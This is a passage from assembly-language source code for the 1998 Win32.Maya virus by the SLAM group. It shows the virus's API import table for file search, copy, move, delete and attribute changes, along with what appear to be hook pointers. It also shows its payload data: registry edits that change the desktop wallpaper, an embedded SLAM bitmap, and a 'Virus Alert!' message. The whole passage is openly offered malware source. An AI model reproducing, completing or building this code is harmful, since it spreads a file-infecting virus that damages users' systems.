maya_findfirstfilea_add		dd 0

maya_findnextfilea_len		dd 14
maya_findnextfilea		db 'FindNextFileA',0
maya_findnextfilea_add		dd 0

maya_findclose_len		dd 10
maya_findclose			db 'FindClose',0
maya_findclose_add		dd 0

maya_setfilepointer_len		dd 15
maya_setfilepointer		db 'SetFilePointer',0
maya_setfilepointer_add		dd 0

maya_setendoffile_len		dd 13
maya_setendoffile		db 'SetEndOfFile',0
maya_setendoffile_add		dd 0

maya_getcurrentdirectorya_len	dd 15h
maya_getcurrentdirectorya	db 'GetCurrentDirectoryA',0
maya_getcurrentdirectorya_add	dd 0

maya_setcurrentdirectorya_len	dd 15h
maya_setcurrentdirectorya	db 'SetCurrentDirectoryA',0
maya_setcurrentdirectorya_add	dd 0

maya_getfileattributesa_len	dd 13h
maya_getfileattributesa		db 'GetFileAttributesA',0
maya_getfileattributesa_add	dd 0

maya_setfileattributesa_len	dd 13h
maya_setfileattributesa		db 'SetFileAttributesA',0
maya_setfileattributesa_add	dd 0

maya_getsystemtime_len		dd 14
maya_getsystemtime		db 'GetSystemTime',0
maya_getsystemtime_add		dd 0

maya_getwindowsdirectorya_len	dd 15h
maya_getwindowsdirectorya	db 'GetWindowsDirectoryA',0
maya_getwindowsdirectorya_add	dd 0

maya_maya	dd 'MAYA'	;endmarker

maya_movefilea_len		dd 10
maya_movefilea			db 'MoveFileA',0
maya_movefilea_add		dd 0
				dd offset maya_deadcode_call1

maya_copyfilea_len		dd 10
maya_copyfilea			db 'CopyFileA',0
maya_copyfilea_add		dd 0
				dd offset maya_deadcode_call2

maya_createfilea2_len		dd 12
maya_createfilea2		db 'CreateFileA',0
maya_createfilea2_add		dd 0
				dd offset maya_deadcode_call3

maya_deletefilea_len		dd 12
maya_deletefilea		db 'DeleteFileA',0
maya_deletefilea_add		dd 0
				dd offset maya_deadcode_call4

maya_setfileattributesa2_len	dd 13h
maya_setfileattributesa2	db 'SetFileAttributesA',0
maya_setfileattributesa2_add	dd 0
				dd offset maya_deadcode_call5

maya_getfileattributesa2_len	dd 13h
maya_getfileattributesa2	db 'GetFileAttributesA',0
maya_getfileattributesa2_add	dd 0
				dd offset maya_deadcode_call6

maya_getfullpathnamea_len	dd 11h
maya_getfullpathnamea		db 'GetFullPathNameA',0
maya_getfullpathnamea_add	dd 0
				dd offset maya_deadcode_call7

maya_createprocessa_len		dd 15
maya_createprocessa		db 'CreateProcessA',0
maya_createprocessa_add		dd 0
				dd offset maya_deadcode_call8

maya_shai		dd 'SHAI'	;endmarker

;
;payload stuff
;

maya_cpd		db 'Control Panel\Desktop',0
maya_reg		dd 0	;@1E76
maya_one		db '1',0	;@1E7A
maya_zero		db '0',0	;@1E7C
maya_tilewallpaper	db 'TileWallpaper',0 ;@1E7E
maya_wallpaperstyle	db 'WallpaperStyle',0
maya_slamfilename	db 'SLAM.BMP',0		;@1E9B
maya_slamhandle		dd 0		;handle of created SLAM.BMP @1EA4
maya_numberofwritten	dd 0		;paramter of WriteFile
maya_mayamsg		db 'Win32.Maya (c) 1998 The Shaitan [SLAM]',0
maya_viralert		db 'Virus Alert!',0
maya_user32		db 'USER32.dll',0	;@1EE0
maya_advapi32		db 'ADVAPI32.dll',0	;@1EEB
maya_u32hand		dd 0		;handle to user32 @1EF8
maya_a32hand		dd 0		;handle to advapi32 @1EFC
maya_dd5		dd 0		;????		@1F00
maya_regopenkeyexa	db 'RegOpenKeyExA',0		;@1F04
maya_regsetvalueexa	db 'RegSetValueExA',0		;
maya_messageboxa	db 'MessageBoxA',0		;
maya_sysparam		db 'SystemParametersInfoA',0
maya_regopenkeyexa_add	dd 0		;add of fn	@1F43
maya_regsetvalueexa_add	dd 0		;add of fn	@1F47
maya_messageboxa_add	dd 0		;add of fn	@1F4B
maya_sysparam_add	dd 0		;add of fn	@1F4F
;
;the 'SLAM' logo stored in bitmap file format
;
slam_len equ 230	;@1F53
slam db  66, 77,230,  0,  0,  0,  0,  0,  0,  0, 62,  0,  0,  0, 40,  0,  0,  0, 60
     db   0,  0,  0, 21,  0,  0,  0,  1,  0,  1,  0,  0,  0,  0,  0,168,  0,  0,  0
     db 196, 14,  0,  0,196, 14,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0
     db   0,255,255,255,  0,255,255,255,255,255,255,255,240,255,255,255,255,255,255
     db 255,240,255,255,255,255,255,255,255,240,255,255,255,255,255,255,255,240,224
     db   2,  0,131,226, 14, 60,112,224,  2,  0,131,226, 14, 60,112,227,130, 15,131
     db 226, 14, 60,112,227,130, 15,131,226, 14, 60,112,227,130, 15,128,  2, 14, 60
     db 112,255,130, 15,128,  2, 14, 60,112,224,  2, 31,195,134, 30, 60,112,224,  2
     db  63,227,142, 62, 60,112,227,254, 63,227,142, 62, 60,112,227,226, 63,227,142
     db  62, 60,112,227,226, 63,227,142, 62, 60,112,227,226, 63,227,142, 62, 60,112
     db 224,  2, 63,224, 14,  0,  0,112,224,  2, 63,224, 14,  0,  0,112,255,255,255
     db 255,255,255,255,240,255,255,255,255,255,255,255,240,255,255,255,255,255,255
     db 255,240

maya_end equ $	

.data
host:
	push 0
	call ExitProcess


end maya





 

